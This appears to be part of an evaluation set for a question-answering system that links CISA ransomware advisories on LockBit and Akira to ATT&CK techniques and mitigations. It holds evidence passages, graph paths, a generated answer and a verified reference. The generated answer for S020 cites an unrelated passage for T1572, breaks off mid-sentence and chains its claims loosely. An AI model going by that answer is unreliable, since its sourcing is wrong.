The advisory lists Advanced Internet Protocol (IP) Scanner among tools used by LockBit affiliates and associates its repurposed use with T1046 (Network Service Discovery in the frozen Enterprise ATT&CK 17.1 reference). This describes the advisory mapping, not all uses of that tool.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
LockBit affiliates have used Mimikatz to dump credentials.
[E2; CISA]
Understanding Ransomware Threat Actors: LockBit
[E3; CISA]
TECHNICAL DETAILS
[E4; CISA]
Table 9: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Defense Evasion
[E5; CISA]
Advanced Port Scanner
Performs network scans.
Finds open Transmission Control Protocol (TCP) and User Data Protocol (UDP) ports for exploitation.
T1046
Network Service Discovery
[E6; CISA]
Table 4: Freeware and Open-Source Tools Used by LockBit Affiliates
[E7; CISA]
Tool
Intended Use
Repurposed Use by LockBit Affiliates
MITRE ATT&CK ID

[E8; ATTACK]
ATT&CK release: 17.1
Technique: Network Service Discovery (T1046)
Mitigation: Network Segmentation (M1030)
[E9; ATTACK]
Ensure proper network segmentation is followed to protect critical servers and devices.
[E10; CISA]
AnyDesk
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
[E11; ATTACK]
ATT&CK release: 17.1
Technique: Remote Access Tools (T1219)
Mitigation: Network Intrusion Prevention (M1031)
[E12; ATTACK]
Network intrusion detection and prevention systems that use network signatures may be able to prevent traffic to remote access services.
[E13; CISA]
Atera Remote Monitoring & Management (RMM)
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
[E14; CISA]
Backstab
Terminates antimalware-protected processes.
Terminates endpoint detection and response (EDR)- protected processes.
T1562.001
Impair Defenses: Disable or Modify Tools
[E15; ATTACK]
ATT&CK release: 17.1
Technique: Disable or Modify Tools (T1562.001)
Mitigation: User Account Management (M1018)
[E16; ATTACK]
Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services.
GRAPH NODES
N1: LockBit affiliates
N2: Mimikatz (S0002)
N3: Advanced Port Scanner
N4: Network Service Discovery (T1046)
N5: Network Segmentation (M1030)
N6: AnyDesk
N7: Remote Access Tools (T1219)
N8: Network Intrusion Prevention (M1031)
N9: Atera Remote Monitoring & Management (RMM)
N10: Backstab
N11: Disable or Modify Tools (T1562.001)
N12: User Account Management (M1018)
GRAPH PATHS
P1: N1 --USES[E1,E2,E3,E4]--> N2
P2: N1 --USES[E5,E6,E7]--> N3 --USES_TECHNIQUE[E5,E6,E7]--> N4 --MITIGATED_BY[E8,E9]--> N5
P3: N1 --USES[E10,E6,E7]--> N6 --USES_TECHNIQUE[E10,E6,E7]--> N7 --MITIGATED_BY[E11,E12]--> N8
P4: N1 --USES[E13,E6,E7]--> N9 --USES_TECHNIQUE[E13,E6,E7]--> N7 --MITIGATED_BY[E11,E12]--> N8
P5: N1 --USES[E14,E6,E7]--> N10 --USES_TECHNIQUE[E14,E6,E7]--> N11 --MITIGATED_BY[E15,E16]--> N12

## S020

Question: In the AA24-109A command-and-control paragraph describing ngrok encrypted sessions that bypass perimeter monitoring, what two-hop path connects Akira actors through ngrok to the cited ATT&CK technique? Explain both source-supported links.

Outcome: answer_ready_for_review

Answer:

Akira actors use ngrok to bypass perimeter monitoring. [E1, E7]
Ngrok is used to hide C2 and remote access/exfiltrate traffic inside legitimate HTTPS connections. [E7]
Akira actors use ngrok to connect to exfiltration servers. [E7]
Ngrok is used to create secure tunnels for data exfiltration. [E7]
The two-hop path connecting Akira actors through ngrok to the cited ATT&CK technique is: Akira actors use ngrok to bypass perimeter monitoring, which is used to hide C2 and remote access/exfiltrate traffic inside legitimate HTTPS connections, which is used to connect to exfiltrat [E1, E7, E5]
The ATT&CK technique is T1572: Protocol Tunneling. [E5]
The mitigation for T1572 is Filter Network Traffic (M1037). [E11]
The actual practical guidance for Filter Network Traffic (M1037) is to filter network traffic to untrusted or known bad domains and resources. [E10]

Verified reference:

In the C2 paragraph of AA24-109A, Akira actors use ngrok to initiate encrypted sessions that bypass perimeter monitoring. That paragraph cites T1572 (Protocol Tunneling). The path is Akira actors → USES → ngrok → USES_TECHNIQUE → T1572.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
beacons.
Akira threat actors use STONESTOP malware to load additional payloads.
End Update
Remote Access Software
T1219
Akira threat actors use legitimate desktop support software like AnyDesk to obtain remote access to victim systems.
Update Nov. 13, 2025
Akira threat actors use SystemBC malware as a RAT.
End Update
Update Nov. 13, 2025
Protocol Tunneling
T1572
Akira treat actors use Ngrok to hide C2 and remote access/exfiltrate traffic inside legitimate HTTPS connections, bypass perimeter defenses, and maintain covert persistent access.
End Update
Table 20. Exfiltration
Technique Title

[E2; CISA]
#StopRansomware: Akira Ransomware
[E3; CISA]
Technical Details
[E4; CISA]
Table 16. Discovery
[E5; ATTACK]
Train users to be aware of impersonation tricks and how to counter them, for example confirming incoming requests through an independent platform like a phone call or in-person, to reduce risk.
[E6; ATTACK]
ATT&CK release: 17.1
Technique: Impersonation (T1656)
Mitigation: User Training (M1017)
[E7; CISA]
 such as File Transfer Protocol (FTP), Secure File Transfer Protocol (SFTP), and cloud storage services like Mega [T1537], to connect to exfiltration servers. In some instances, Akira threat actors use Ngrok to create secure tunnels for data exfiltration [T1090].
After exfiltrating data, Akira threat actors use a double-extortion model [T1657], which involves threat actors both encrypting systems [T1486] and threatening to leak sensitive information. The Akira ransom note provides each company with a unique code and instructions to contact the threat actors via a .onion URL, which is accessible through the Tor network [T1090.003][T1573.002].
(Note: Tor, short for The Onion Router, is a decentralized network designed to anonymize internet traffic by routing it through multiple servers, encrypting data at each step. This network is often leveraged by threat actors to conceal their identities and activities, enabling secure and 
[E8; ATTACK]
If a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity.
[E9; ATTACK]
ATT&CK release: 17.1
Technique: User Execution (T1204)
Mitigation: Network Intrusion Prevention (M1031)
[E10; ATTACK]
Consider filtering network traffic to untrusted or known bad domains and resources. 
[E11; ATTACK]
ATT&CK release: 17.1
Technique: Protocol Tunneling (T1572)
Mitigation: Filter Network Traffic (M1037)
GRAPH NODES
GRAPH PATHS
